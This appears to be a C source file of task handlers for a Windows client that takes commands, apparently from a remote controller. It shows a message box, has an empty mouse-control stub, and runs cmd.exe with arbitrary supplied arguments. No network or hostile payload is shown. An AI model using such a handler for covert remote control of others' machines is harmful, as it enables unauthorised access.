#include <tchar.h> // _tcscpy_s, _tcscmp

#include "Commands.h"
#include "..\Debugger.h"

VOID _on_task_MESSAGEBOX(CONST PTCHAR args, PTCHAR result)
{
	if (!MessageBoxEx(NULL, args, TEXT("ERROR"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)))
		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
	else
		_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
}

VOID _on_task_MOUSECTRL(CONST PTCHAR args, PTCHAR result)
{
	
}

VOID _on_task_EXECUTECMD(CONST PTCHAR args, PTCHAR result)
{
	SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
	shell.fMask            = SEE_MASK_DEFAULT;
	shell.lpVerb           = TEXT("open"); // Yep, i know that it ia a default value
	shell.lpFile           = TEXT("cmd.exe");
	shell.lpParameters     = args;
	shell.nShow            = SW_SHOW;
	if (!ShellExecuteEx(&shell))
		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
	else
		_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
}

INT cmd2code(CONST PTCHAR cmd)
{
	for (size_t i = 0ul; i < NUMBER_OF_COMMANDS; ++i)
		if (_tcscmp(MAP_COMMANDS[i].pair.name, cmd) == 0)
			return MAP_COMMANDS[i].pair.code;
	
	return UNDEFINEDCMD;
}

CONST PTCHAR code2cmd(INT code)
{ 
	for (size_t i = 0ul; i < NUMBER_OF_COMMANDS; ++i)
		if (MAP_COMMANDS[i].pair.code == code)
			return MAP_COMMANDS[i].pair.name;

	return UNDEFINEDP;
}